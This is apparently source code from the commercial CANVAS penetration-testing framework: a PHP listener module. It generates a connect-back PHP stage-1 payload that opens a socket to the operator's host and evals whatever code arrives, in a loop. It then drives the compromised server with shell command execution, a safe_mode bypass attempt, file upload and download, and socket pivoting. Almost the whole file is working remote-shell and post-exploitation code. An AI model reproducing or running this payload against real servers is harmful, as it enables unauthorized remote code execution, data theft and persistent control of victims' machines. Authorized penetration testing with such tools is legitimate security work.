#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

"""
phplistener.py

Listener for connections to PHP servers

"""
import os, sys
import socket
import string
import time
import random

import canvasengine
from shellserver import shellserver
from libs.canvasos import canvasos
from exploitutils import *
from canvaserror import *
from internal import * #devlog
from ExploitTypes.php_break_safemode import php_break_safemode
import engine.config


def rand_str(size=8, chars=string.ascii_letters + string.digits):
    # php must start with a letter...
    s = ''.join(random.choice(string.ascii_letters) for _ in range(1))
    return s + ''.join(random.choice(chars) for _ in range(size-1))


def get_php_stage1(badchars,localhost,localport, universal=None, legacy=True):
    """
    Returns a "stage 1" for PHP shell. It theoretically also avoids badchars, but right now
    this is not done. Like MOSDEF it just does a while (1) read more data in a connectback socket.
    Universal is a canvasexploit if set.

    Legacy support is available for PHP 4 and earlier (which don't have try/catch).

    """

    phpcode=""
    mosdef_type=None
    mosdef_id=None
    htonl_data = rand_str()
    my_int = rand_str()
    if universal!=None:
        #We've gotten an engine to get our univeral information from, and we need to do universal protocol header
        #PHP has no htonl natively.
        mosdef_type=universal.engine.getMosdefType(canvasengine.PHPMULTI)
        mosdef_id=universal.engine.getNewMosdefID(universal)
        phpcode +="""
    function htonl(${my_int}) {{
            ${htonl_data}=chr(${my_int} & 0xff000000).chr(${my_int} & 0x00ff0000).chr($my_int & 0x0000ff00).chr(${my_int} & 0x000000ff);
            return ${htonl_data};
        }}
    """

    rb_data0 = rand_str()
    rb_data1 = rand_str()
    rb_data2 = rand_str()
    rb_data3 = rand_str()

    phpcode+="""
function read_block($sock) {{
    ${data}=fread($sock,4);
    if(empty(${data})){{
        die();
    }}
    $size=(ord(${data}{{0}}) * (pow(2,24))) + (ord(${data}{{1}}) * pow(2,16)) + (ord(${data}{{2}}) * pow(2,8)) + ord(${data}{{3}});
    ${data2}="";
    while ($size > 0 ) {{
        ${data3}=fread($sock,$size);
        if (${data3}===FALSE) {{
            break;
        }}
        ${data2}=${data2}.${data3};
        $size-=strlen(${data3});
   }}
   return ${data2};
}}

$f=fsockopen("{localhost}",{localport});

if ($f) {{
"""

    if universal!=None:
        #here we send two integers down the line
        phpcode+="""
        fwrite($f,htonl({mosdef_type}));
        fwrite($f,htonl({mosdef_id}));
    """
    phpcode+="""
   while (1) {{
      ${data1}=read_block($f);
      //file_put_contents("/tmp/t", ${data1});
      if (${data1}=="") {{
       break;
      }}
      """
    if legacy:
        #no try/catch is available in PHP 4 or below
        #this doesn't work in safe mode
        phpcode+="""
        @set_time_limit(0);
        @ini_set('max_execution_time',0);
        @ignore_user_abort(true);
        eval(${data1});
    """

    else:
        # wtf is this?
        phpcode+="""
          try {{
           eval(${data1});
            }}
          catch (Exception $e) {{
            //ignore - probably all is lost, but we'll give it a shot.
            }}
            """

    phpcode+="""
   }}
 }}
    """

    dic = {"my_int":my_int, "htonl_data":htonl_data, "data":rb_data0, "data1":rb_data1, "data2":rb_data2, "data3":rb_data3, "localhost":localhost, "localport":localport, "mosdef_type":mosdef_type, "mosdef_id":mosdef_id}
    phpcode = phpcode.format(**dic)

    return phpcode

class phplistener(shellserver):
    def __init__(self, connection , logfunction=None):
        shellserver.__init__(self,connection,type="Active",logfunction=logfunction)
        devlog("phplistener","New PHP listener connection:%s"%connection)
        self.engine                 = None
        self.sent_init_code         = False
        self.connection             = connection #already done, but let's make it here as well
        self.na                     = "This is a php listener - that command is not supported"
        self.have_pcntl             = False #assume true at first, then reset later if not true. (see dospawn)
        self.next_socket_id         = 0;
        self.SO_REUSEADDR           = 5 #added
        self.pid=""
        self.order=big_order
        self.special_shellserver_send=True #modern version
        self.safe_mode_possibly_on=True
        self.broke_safemode=False
        self.disable_functions   = []
        # these functions are enabled
        self.php_shell_functions = {"shell_exec": 1,
                                    "exec":       1,
                                    "passthru":   1,
                                    "system":     1,
                                   }
        return

    def startup(self):
        """
        Our first stage already loops, so we should be good to go on that.
        """
        if self.sent_init_code:
            return
        self.sent_init_code=True
        phpcode=self.get_init_code()
        self.log("Sending init code...%d bytes"%len(phpcode))
        self.send_buf(phpcode)
        self.leave()
        self.log("Sent init code")
        #no response is expected
        return

    def sendraw(self,buf):
        """
        send data to the remote side - reliable
        """
        self.connection.sendall(buf)
        return

    def send_raw_buf(self, buf):
        """
        Sends the data over with a prepended length
        """
        self.sendraw(self.order(len(buf)))
        self.sendraw(buf)
        return

    def send_buf(self,buf):
        """
        send data block to remote side - first we
        enter our mutex so that no one else takes over
        this connection while we are sending.

        Once you're done reading from the socket
        you need to call self.leave() - this will
        allow other threads to use this shellserver as well.

        Likewise, you can't call send_buf twice in a row as this
        will cause mutex fail.

        """
        if not self.connection:
            self.log("Cannot send - connection has died :<")
            return
        self.enter()
        self.send_raw_buf(buf)
        return

    def read_int(self):
        """
        This function reads a single 4 byte integer value from the remote end.
        Connection could be SSL
        """
        if not self.connection:
            self.log("Cannot recv: no connection")
            return 0
        r  = self.connection.recv(4)
        if len(r) !=4:
            self.log("Connection closed!")
            self.connection=None #fail :<
            raise Exception, "PHP Connection closed."
        #devlog("phpshell", "Got bytes %x%x%x%x" % (ord(r[3]) ,ord(r[2]),ord(r[1]),ord(r[0])))
        #print "LENGTH1: %s" % r
        #r = struct.unpack(">I", r);
        r = str2bigendian(r)
        #print "LENGTH2: %d" % r
        devlog("phpshell", "Reading int: %d" % r )
        return r

    def read_string(self):
        """
        Read a string from the remote side
        TODO: make this a reliable recv...perhaps with timeout
        """
        if not self.connection:
            self.log("Cannot recv: no connection")
            return ""

        size=self.read_int()
        if size>0xfffff:
            self.log("Garbled size value %x"%size)
            return ""
        devlog("phpshell","Reading data: %d bytes"%size)
        dataarray=[]
        if size==0:
            return ""
        gotsize=0
        while gotsize<size:
            data=self.connection.recv(size)
            dataarray+=[data]
            gotsize+=len(data)
        return "".join(dataarray)

    def get_init_code(self):
        """
        returns the code for sending a string to our data
        """
        #need to use pcntl_fork() to avoid apache killing us off after 30 seconds...
        #need tocheck for safe mode as well
        """
        // Check for safe mode
        if( ini_get('safe_mode') ){
        // Do it the safe mode way
        }else{
        // Do it the regular way
        }

        """
        #php strlen() is really len() in python, although it can be overloaded by mb_strlen() in which
        #case it will do the entirely wrong thing. See: http://us3.php.net/manual/en/function.strlen.php
        #for a solution

        #stream_set_timeout doesn't work in safe_mode
        phpcode="""
        stream_set_timeout($f,5000000);
        $pid=0;
        //$pid=pcntl_fork();
        if ($pid) {
           pcntl_waitpid(0,$status);
        }
        //else child, continue with life

    // works
    function big_order($myint) {
            $junk=chr(($myint & 0xff000000) >> 24).chr(($myint & 0x00ff0000) >> 16).chr(($myint & 0x0000ff00) >> 8).chr(($myint & 0x000000ff) >> 0);
            return $junk;
        }

        function sendstring($sock,$buf) {
           $buf_size=strlen($buf);
           $size_str=big_order($buf_size);
           //$size_str=pack('N', $buf_size);
           $size_sent=0;
           fwrite($sock, $size_str, 4);
           while ($size_sent < $buf_size) {

              $result=fwrite($sock, $buf);
              if ($result==FALSE) {
                break;
              }
              $size_sent+=$result;
              }
        }

        function send_int($sock, $number) {
            fwrite($sock, big_order($number));
        }

        function readblock($sock) {
          //returns a block of data
          $data=fread($sock,4);
          $size=(ord($data{0}) * (pow(2,24))) + (ord($data{1}) * pow(2,16)) + (ord($data{2}) * pow(2,8)) + ord($data{3});

          $data2="";
          while ($size > 0 ) {
              $data3=fread($sock,$size);
              if ($data3==FALSE) {
                  break;
              }
              //printf("Read %d bytes",strlen($data3));
              $data2=$data2.$data3;
              $size=$size-strlen($data3);
            }
        return $data2;
        }

        function gdf_i() {
            $data = get_defined_functions();
            return implode(",", $data["internal"]);
        }

        function gdf_u() {
            $data = get_defined_functions();
            return implode(",", $data["user"]);
        }
        """
        return phpcode

    def pwd(self):
        """
        Get current working directory
        """
        return self.runPhp("getcwd()")

    def runPhp(self, phpcommand):
        """
        Runs a single php statement that must evaluate to a string
        """
        devlog("phplistener", "runPhp(\"%s\")"%phpcommand)
        #print "phplistener", "runPhp(\"%s\")"%phpcommand
        self.send_buf("sendstring($f, %s);" % phpcommand)
        ret=self.read_string()
        #print "result: %s" % ret
        self.leave()

        return ret

    def python_safe(self, command):
        """
        Bypass safe_mode if the python module is installed with PHP
        Add CVE when its assigned.
        """

        code="""
        $data=python_call("commands","getoutput","TEMPSTRING");
        send_int($f,$retval);
        sendstring($f,$data);
        """.replace("TEMPSTRING",command)

        return code

    def runPhp_i(self, phpcommand):
        devlog("phplistener", "runPhp_i('%s')"%phpcommand)
        self.send_buf(phpcommand)
        ret=self.read_int()
        self.leave()
        return ret

    def runPhpInt(self, phpcommand):
        """
        Runs a single php statement that must evaluate to an int
        """
        devlog("phplistener", "runPhpInt('%s')"%phpcommand)
        self.send_buf("send_int($f, %s);" % phpcommand)
        ret=self.read_int()
        self.leave()

        return ret

    def getPlatformInfo(self):
        s = self.runPhp("php_uname()")
        self.log("Got platformInfo: %s" % s)
        if len(s):
            self.uname = s
            os = canvasos()
            os.load_uname(s)
            ret = os
        else:
            ret = None
        return ret

    def getPHPSAPI(self):
        """
        gets the current SAPI
        """
        sapi = self.runPhp("php_sapi_name()")
        self.log("Got SAPI: %s"  % sapi)
        return sapi

    def determine_exec_functions(self):
        """
        determines which PHP shell functions we can use
        """
        for function, enabled in self.php_shell_functions.iteritems():
            if function in self.disable_functions:
                # sorry, but these functions are not allowed to use
                self.php_shell_functions[function] = 0

    def get_defined_functions_internal(self):
        dfi = self.runPhp("gdf_i()")
        self.log("PHP found %d internally defined functions" % len(dfi.split(",")))
        return dfi

    def get_defined_functions_user(self):
        dfu = self.runPhp("gdf_u()")
        self.log("PHP found %d user defined functions" % len(dfu.split(",")))
        return dfu

    def clearPHPSocket(self):
        """
        clears the first few bytes from the socket as its in big endian.
        """
        clear = self.runPhp("eval('echo _;')")
        self.log("Clearing socket of: %s"  % clear)
        return clear

    def getPHPVersion(self):
        s = self.runPhp("phpversion()")
        self.log("Got php version: %s"  % s)
        return s

    def getPHPIniVal(self, key, string=False):
        if not string:
            s = self.runPhpInt("ini_get('%s')" % key)
        else:
            # some ini settings return a string you know!
            s = self.runPhp("ini_get('%s')" % key)

        devlog("phplistener","Got PHP Config %s: %s" % (key, s))
        return s

    def getPHPVar(self, var):
        s = self.runPhp("strval($%s)" % var)
        self.log("Got PHP var %s: %s" % (var, s))
        return s

    def getcwd(self):
        return self.pwd()

    def runcommand(self,command, LFkludge=False):
        """
        Emulate standard unix shell runcommand interface
        """
        # Standard runcommand api is to ignore errors. For now. :(
        data, rv = self.shellcommand(command)

        if rv != 0:
            self.log("Warning, shell command '%s' returned nonzero value %d" % (command, rv))

        return data

    def break_safemode(self):
        """
        Break safemode on this Node
        """
        bypass = php_break_safemode(self)
        if(bypass.run_exploits() == 1):
            self.log("[C] Safe mode bypassed")
            self.safe_mode_possibly_on=False
            self.broke_safemode=True
        else:
            self.log("Failed to break safe mode!")
            return False
        return True

    def shellcommand(self, command, LFkludge=False):
        """
        Running a command is easy with a shell
        Attempt safe_mode bypass and other functions.
        """

        # escape quotes
        command=command.replace("\"","\\\"")
        self.log("Executing %s"%command)

        # josh: changed this to fix the lack of
        # command output when safemode is broken
        # by essers interupt exploit
        # ob_start(): http://php.net/ob_start

        # steve: just break on the first available command
        # that we have and use that function.
        # special cases for passthru as it accepts 2 args
        # popen will also be special, custom code for these...

        php_func = ""
        for func, flag in self.php_shell_functions.iteritems():
            if flag == 1:
                php_func = func
                break

        # passthru support
        if php_func == "passthru":
            code="""
                $command = "COMMAND";
                ob_start();
                PHP_FUNCTION($command, $retval);
                $data = ob_get_contents();
                ob_end_clean();
                rtrim($data);
                send_int($f,$retval);
                sendstring($f,$data);
                """.replace("COMMAND",command)
        # elif add support for popen etc
        # finally, the standard PHP code unless we use passthru, popen, etc
        else:
            code="""
                $command = "COMMAND";
                ob_start();
                PHP_FUNCTION($command);
                $data = ob_get_contents();
                ob_end_clean();
                rtrim($data);
                $retval = 0;
                if (isset($data)){$retval=1;}
                send_int($f, $retval);
                sendstring($f,$data);
                """.replace("COMMAND",command)
        code = code.replace("PHP_FUNCTION", php_func)

        # try to bypass safe_mode if enabled.
        if self.safe_mode_possibly_on:
            s = self.getPHPIniVal("safe_mode")
            break_safemode=engine.config.CanvasConfig.get("break_php_safemode")

            if break_safemode and s == 1:
                devlog("phplistener", " Attempting to bypass safe_mode..")
                self.break_safemode()

            else:
                self.safe_mode_possibly_on=False
                devlog("phplistener"," No need to bypass safe_mode for this Node!")

        if not self.safe_mode_possibly_on:
            self.send_buf(code)
            #first read return value
            rv   = self.read_int()
            #then read the result of our command
            data = self.read_string()
            self.leave()
            self.log("Executed remote command '%s', return val: %d (%d bytes of output)" % (command, rv, len(data)))
            if rv==127 and data!="":
                devlog("phplistener", "Got data, but also error message of 127...")
                if self.broke_safemode:
                    devlog("phplistener", "Hardcoding runcommand return value to 0")
                    #for some reason, this is always 127 even when it works after we break safemode
                    rv=0 #so let's hardcode this to 0 since it's not really failing.
        else:
            data = "Safe mode on, can't use passthru to execute commands!"
            rv = -1
        #print data
        return (data, rv)

    def dospawn_no_pcntl(self, command, arguments):
        """
        This is the function we run if pcntl was not compiled into the PHP install.
        This only works on Unix due to shell syntax usage.
        """
        if arguments==None:
            arguments=""
        command = command + " " + arguments + " > /dev/null 2> /dev/null &"
        code="""
        $command="COMMAND % > /dev/null";
        unset($output);
        exec($command, $output, $retval);
        $data=implode("\n", $output);
        send_int($f,$retval);
        """.replace("COMMAND",command)
        self.send_buf(code)
        rv = self.read_int()
        self.leave()
        return "Spawned %s"%command

    def dospawn(self,command, arguments=None):
        """
        This will only be available on Unix...
        This try/catch is not working for me, and causing PHP shell to die :<
        So right now, we always set self.have_pcntl to False.

        This may be an issue with PHP4 not supporting try/catch! :? !!!

        """
        self.log("Spawning %s:%s"%(command, arguments))
        if not self.have_pcntl:
            return self.dospawn_no_pcntl(command, arguments)

        if arguments==None:
            #command is a shell command to spawn, not an exectuable to execve()
            code="""
            $command="sh";
            $args = array("-c","COMMAND");
            try {
                $pid = pcntl_fork();
                }
            catch (Exception $e) {
                $pid=-1; //-1 indicates could not fork or pcntl not installed.
            }

            switch ($pid) {
               case 0:
                  /* child */
                  pcntl_exec($command, $args);
                  exit(0); //failed to exec
               default:
                  /* parent */
                  send_int($pid);
                  break;
            }
            """.replace("COMMAND",command)
        else:
            #TODO
            pass

        self.send_buf(code)
        rv = self.read_int()
        self.leave()
        if rv==-1:
            self.log("No pcntl support")
            self.have_pcntl=False
            return self.dospawn_no_pcntl(command,arguments)
        else:
            self.log("Exec'd remote command pid=%s '%s'" % (rv, command))
            return "Spawned command"

    def dounlink(self,filename):
        return self.na

    def do_cd(self,directory):
        self.log("Changing directory to %s"%directory)
        code="""
        chdir("DIRECTORY");
        """.replace("DIRECTORY",directory)
        self.send_buf(code)
        self.leave()
        return "Changed directory to %s"%directory

    def chdir(self,directory):
        return self.cd(directory)

    def dodir(self,directory):
        cmd = "ls -lat" # Seems like a safe default for a php server
        if not self.node.isOnAUnix():
            cmd = "dir"

        # We dont need to do "dir '.'" or "ls '.'"
        if directory != "" and directory != '.':
            cmd += " '%s'"  % directory
        data,rv = self.shellcommand(cmd)
        if rv != 0:
            raise NodeCommandError("Error %d when running %s" % (rv, cmd))
        else:
            return data

    def stat(self, filename):
        rv = None
        statMap = { 0: "dev", 1:"inode", 2:"mode", 3:"nlink", 4:"uid", 5:"gid", 6:"rdev", 7:"size", 8:"atime", 9:"mtime", 10:"ctime", 11:"blksize", 12:"blocks" }
        code = """
        $s = stat("FILENAME");
        if ($s == FALSE) {
            send_int($f, 1);
        } else {
            send_int($f, 0);
            for ($i=0; $i <= 12; $i++) {
                send_int($f, $s[$i]);
            }
        }
        """.replace("FILENAME", filename)
        self.send_buf(code)
        x = self.read_int()
        self.leave()
        if x == 1:
            rv = None
        elif x == 0:
            fs = {}
            indexes = statMap.keys()
            indexes.sort()
            for i in indexes:
                v = self.read_int()
                fs[statMap[i]]=v
            rv = fs
            devlog("phpshell","Got stat: %s" % str(fs))

        return rv

    def hasExtension(self, ext):
        s = self.runPhpInt("extension_loaded('%s')" % ext)
        self.log("PHP extension %s loaded: %s" % (ext, s))
        if s == 1:
            return True
        else:
            return False

    def ids(self):
        """
        Gets our uid/gid etc. Same interface as other posix nodes
        """
        if self.hasExtension("posix"):
            uid  = self.runPhpInt("posix_getuid()")
            euid = self.runPhpInt("posix_geteuid()")
            gid  = self.runPhpInt("posix_getgid()")
            egid = self.runPhpInt("posix_getegid()")
            self.log("PHP's UID: %d EUID: %d GID: %d EGID: %d" % (uid, euid, gid, egid))
            return (uid, euid, gid, egid)
        else:
            raise NodeCommandError("PHP does not have posix extensions available, so can't get uid/gid")

    def getpid(self):
        """
        Get PID on Posix
        """
        if self.hasExtension("posix"):
            pid=self.runPhpInt("posix_getpid()")
            self.pid=pid
            return pid
        else:
            raise NodeCommandError("PHP does not have posix extensions available, so can't get pid")
        return None

    def upload(self,source,dest=".",destfilename=None):
        try:
            tFile=open(source,"r")
            alldata=tFile.read()
            tFile.close()
        except IOError, i:
            raise NodeCommandError("Unable to read source file: %s" % str(i))

        sep = "/"

        if destfilename != None:
            destfile = dest + sep + destfilename
        else:
            destfile = dest + sep + source.split(os.path.sep)[-1]

        self.log("Sending %d bytes to %s"%(len(alldata),destfile))

        code="""
        $data=readblock($f);
        //printf("hai, read %d bytes", strlen($data));
        $newfile=fopen("FILENAME","wb");
        if ($newfile == FALSE) {
            send_int($f, 0);
        } else {
            $w = fwrite($newfile,$data);
            if ($w == FALSE) {
                sent_int($f, 1);
            } else {
                send_int($f, 2);
            }
            fclose($newfile);
        }
        """.replace("FILENAME",destfile)
        self.send_buf(code)
        self.send_raw_buf(alldata)
        r = self.read_int()
        self.leave()
        if r == 0:
            e = "Unable to open remote file"
        elif r == 1:
            e = "Unable to write remote file"
        elif r == 2:
            e = "Wrote data successfully"
        else:
            e = "Got unknown status code %d from remote upload stub" % r

        self.log(e)
        if r != 2:
            raise NodeCommandError(e)

        return "Sent %d bytes from %s" % (len(alldata),source)

    def download(self,source,dest="."):
        ret = ""
        rv = True

        if os.path.isdir(dest):
            dest=os.path.join(dest,source.replace("/","_").replace("\\","_"))

        try:
            outfile=open(dest,"wb")
        except IOError, i:
            e = "Failed to open local file: %s" % str(i)
            self.log(e)
            rv = False
            ret = e

        if rv:

            fs = self.stat(source)
            if fs == None:
                rv = False
                e = "Unable to stat remote file"
                self.log(e)
                ret = e
                outfile.close()
                os.unlink(dest)

            else:
                self.log("Reading %d bytes from remote file %s" % (fs["size"], source))
                code="""
                $data=file_get_contents("FILENAME");
                sendstring($f,$data);
                """.replace("FILENAME",source)
                self.send_buf(code)
                data=self.read_string()
                self.leave()
                self.log("Got %d bytes"%len(data))

                try:
                    outfile.write(data)
                    outfile.close()
                    rv = True
                    ret = "Read %d bytes of data into %s"%(len(data),dest)
                    self.log(ret)

                except IOError,i:
                    e = "Error writing to local file: %s" % str(i)
                    self.log(e)
                    ret = e
                    rv = False

        if not rv:
            raise NodeCommandError(ret)

        return ret

    def getnewid(self):
        self.next_socket_id+=1
        return self.next_socket_id

    def getListenSock(self,addr,port):
        """
        Creates a tcp listener socket fd on a port
        """
        listenc="""
        $a='ADDR';
        $p='PORT';

        if (false == ($socket = @socket_create(AF_INET, SOCK_STREAM, 0)))
        {
            send_int($f,-1);
        }
        else
        {
        //we should always end up here
        send_int($f, 1);

        $i = socket_bind($socket,$a,$p);
        if ($i) {
            send_int($f,1);
            $q = socket_listen($socket,16);
            if ($q) {
                send_int($f,1);
                //Create socket array if we need to
                if (!$socket_array)
                {
                    $socket_array=array();
                }
                $socket_array[SOCKETID] = $socket;
                send_int($f, 1); //verify it went into the array
                }
            else {
                send_int($f, 0);
            }
        }
        else {
            send_int($f,0);
        }

        }
        """
        socket_id=self.getnewid()
        listenc=listenc.replace("ADDR",str(addr))
        listenc=listenc.replace("PORT",str(port))
        listenc=listenc.replace("SOCKETID",str(socket_id))
        self.send_buf(listenc)

        socket_create_fd=self.read_int()
        if socket_create_fd==-1:
            self.leave()
            return 0 #failed to create socket
        socket_bind_ret=self.read_int()
        if socket_bind_ret==0:
            #failed to bind
            self.leave()
            return 0
        listen_ret=self.read_int()
        if listen_ret ==0:
            #failed to listen
            self.leave()
            return 0
        array_ret=self.read_int()
        self.leave()
        devlog("phplistener","PHP listen socket=%d, array_ret=%d"%(socket_id, array_ret))
        return socket_id

    def isactive(self,fd,timeout=0):
        """
        Checks to see if fd is readable
        """
        devlog("phplistener", "PHP FD isactive(%s, Timeout=%s) ?"%(fd,timeout))
        activec="""
        $read   = array($socket_array[SOCKET_FD]);
        $except = NULL;
        $write  = NULL;

        $tv_usec=0;
        $tv_sec=TIMEOUT;

        $i = socket_select($read,$write,$except,$tv_sec,$tv_usec);
        if (!$i){
                 //debug();
                 // Theoretically, we dont need to check if fd is our fd, cause we
                 // only send one fd, our fd :D
                 send_int($f, 0);
                 }
        else{
            //socket is not active (waiting for a recv)
            send_int($f,1);
        }

        """
        activec=activec.replace("SOCKET_FD",str(fd))
        activec=activec.replace("TIMEOUT",str(timeout))
        self.send_buf(activec)
        ret=self.read_int()
        self.leave()
        devlog("phplistener", "isactive(%s)=%d"%(fd,ret))
        if ret ==0:
            #failed
            return -1
        #success!
        return ret

    def accept(self,fd):
        """accept()"""
        accode="""
        $socket = $socket_array[SOCKET_FD];
        $i = socket_accept($socket);
        if (!$i) {
           send_int($f, 0);
           }
        else {
           send_int($f, 1);
           $socket_array[SOCKET_NEWID]=$i;
        }

        """
        newid=self.getnewid()
        accode=accode.replace("SOCKET_FD",str(fd))
        accode=accode.replace("SOCKET_NEWID",str(newid))
        devlog("phplistener","DATA=%s"%accode)
        self.send_buf(accode)
        devlog("phplistener","PHP accept(%s)"%fd)
        ret=self.read_int()
        self.leave()
        devlog("phplistener","PHP accept(%s)=%d"%(fd,ret))
        if ret==0:
            #failed
            return -1
        #success!
        return newid

    def setsockopt(self,fd,option,arg):
        """
        """
        optcode="""
        $socket = $socket_array[SOCKET_FD];
        socket_set_option($socket,SOL_SOCKET,SO_REUSEADDR,1);
        """
        optcode=optcode.replace("SOCKET_FD",str(fd))
        self.send_buf(optcode)
        self.leave()
        return

    def setblocking(self,fd,blocking):
        """set non blocking"""
        devlog("phplistener","setblocking(%s,%s)"%(fd,blocking))
        blockc="""

        $NonBlock = BLOCKING;

        $socket = $socket_array[SOCKET_FD];

        if( $NonBlock ) {
            $ret = socket_set_nonblock($socket);
        } else {
            $ret = socket_set_block($socket);
        }
        send_int($f, $ret);
        """
        blockc=blockc.replace("SOCKET_FD",str(fd))
        if blocking:
            blocking = 0
        else:
            blocking = 1
        blockc=blockc.replace("BLOCKING",str(blocking))
        devlog("phplistener","DATA=%s"%blockc)
        self.send_buf(blockc)
        ret=self.read_int()
        self.leave()
        devlog("phplistener","setblocking(%s)=%s"%(blocking,ret))
        return ret

    def socket_create(self, proto):
        """
        PHP Socket Creation
        """

        phpcode="""
        if (false == ($socket = @socket_create(AF_INET, SOCK_STREAM, PROTOCOL)))
        {
            send_int($f,1); // fail
        }
        else
        {
            if (!$socket_array)
            {
                $socket_array=array();
            }

            $socket_array[SOCKETID] = $socket;
            send_int($f,0); // win
        }
        """.replace("PROTOCOL", str(proto))

        socketid=self.getnewid()
        phpcode=phpcode.replace("SOCKETID",str(socketid))
        ret=self.runPhp_i(phpcode)

        if ret!=0:
            return -1 #error
        else:
            return socketid #ret value


    def socket(self,proto):
        """
        create our socket
        """
        if proto.lower()=="tcp":
            proto="0"
        ret=self.socket_create(proto)
        return ret

    def connect(self, fd, host, port, protocol, timeout):
        """
        connect to our socket
        """
        code="""
           $socket = $socket_array[SOCKET_FD];
           $ret    = socket_connect($socket, "HOST", PORT);

           send_int($f,$ret);
        """
        code=code.replace("SOCKET_FD",str(fd))
        code=code.replace("HOST", host)
        code=code.replace("PORT", str(port))
        devlog("phpshell::connect","DATA=%s"%code)
        ret=self.runPhp_i(code)

        if ret==1:
            ret=0
            #success
        else:
            #failed to connect
            ret=-1
        devlog("phpshell::connect","RET=%s"%ret)

        return ret

    def send(self, fd, buffer):
        """
        send/write to our socket
        """
        sendc="""
        $buff   = base64_decode("BUFFER");
        $socket = $socket_array[SOCKET_FD];
        $ret    = socket_write($socket,$buff,strlen($buff));

        send_int($f,$ret);
        """
        sendc=sendc.replace("SOCKET_FD",str(fd))
        sendc=sendc.replace("BUFFER",b64encode(buffer).strip())
        #self.log("DATA=%s"%sendc)
        ret=self.runPhp_i(sendc)

        #self.log("RET=%s"%ret)
        return ret

    def getrecvcode(self,fd,length):
        """
        recv code!
        """
        code="""
        $wanted = LEN;
        $fd     = $socket_array[SOCKET_FD];

        while ($wanted > 0 ) {
            if ($wanted < 1000) {
              $i=socket_recv($fd,$buf,$wanted,0);
            }
            else
            {
              $i=socket_recv($fd,$buf,1000,0);
            }
           if ($i==0){
               continue;
           }elseif($i == false)  {
               sendstring($f,"");
               $wanted=0;
           }
           else
           {
               sendstring($f,$buf);
               $wanted=$wanted-$i;
           }
        }
        """
        code=code.replace("LEN",str(length))
        code=code.replace("SOCKET_FD",str(fd))
        return code

    def getsendcode(self,fd,buffer):
        """
        send code
        """
        scode="""
          $p         =    base64_decode("BUF");
          $wanted    =    strlen($p);
          $fd        =    $socket_array[SOCKET_FD];
          $failed    =    false;

          while ($wanted > 0 ) {
          $i=socket_write($fd,$p,$wanted); // flags set to zero here
          if ($i<0) {
            $wanted=0;
            send_int($f,0);
            $failed=true;
           }
           $wanted=$wanted-$i;
           $p=$p+$i;
          }
          if (!$failed) {
           send_int($f,1);
          }
        """
        scode=scode.replace("SOCKET_FD",str(fd))
        scode=scode.replace("BUF",b64encode(str(buffer)).strip())
        devlog("phplistener","buffer=%s"%scode)
        return scode

    def reliable_recv(self, length):
        """
        Reads all of a connection's data up until length.
        """
        wanted=length
        ret=[]
        while wanted > 0:
            buffer=self.read_string()
            ret+=[buffer]
            wanted=wanted-len(buffer)
        return "".join(ret)

    def recv(self,fd, length):
        """
        recv!
        """
        message=self.getrecvcode(fd,length)
        self.send_buf(message)
        buffer=self.get_from_recv_code(length)
        devlog("phplistener","Recv Got %d: %s"%(len(buffer),prettyprint(buffer)))
        return buffer

    def get_from_recv_code(self,length):
        buffer=self.reliable_recv(length)
        self.leave()
        return buffer

    def recv_lazy(self,fd,timeout=-2,length=1000):
        """"
        recv data from our socket
        """
        recvc="""
        $read   = array($socket_array[SOCKET_FD]);
        $except = array($socket_array[SOCKET_FD]);
        $write  = NULL;

        $tv_usec=0;
        $tv_sec=TIMEOUT;

        $i = socket_select($read,$write,$except,$tv_sec,$tv_usec);
        send_int($f,$i);

        if ($i){
           $socket = $socket_array[SOCKET_FD];
           // length would be set to 1.. we dont want to ret 1 byte at a time.
           $a = socket_recv($socket,$buf,LENGTH,0);
           send_int($f, $a);
           if ($a){
              sendstring($f,$buf);
           }
        }
        """
        recvc=recvc.replace("SOCKET_FD",str(fd))
        recvc=recvc.replace("LENGTH",str(length))
        recvc=recvc.replace("TIMEOUT",str(timeout))

        #devlog("phplistener","Recv_lazy DATA=%s"%recvc)
        self.send_buf(recvc)
        select_ret=self.read_int()
        if select_ret:
            recv_ret=self.read_int()
            if recv_ret:
                data=self.read_string()
                devlog("phplistener","Returning : %s"%repr(data))
                self.leave()
                return data
            else:
                #recv failed
                devlog("phplistener", "Recv Failed")
                self.leave()
                raise socket.error
        else:
            #timeout
            print "Timeout"
            self.leave()
            raise timeoutsocket.Timeout
        #code shouold never reach here
        return

    def close(self, fd):
        """
        close our socket
        """
        devlog("phplistener", "Closing %s"%fd)
        closec="""
        $socket = $socket_array[SOCKET_FD];
        $ret    = socket_close($socket);

        send_int($f,$ret);
        unset($socket_array[SOCKET_FD]);
        """.replace("SOCKET_FD",str(fd))
        ret=self.runPhp_i(closec)
        return ret

    def get_shell(self):
        """
        spawn telnet client with remote end hooked to it
        TODO
        """

if __name__=="__main__":
    p=phplistener(None)
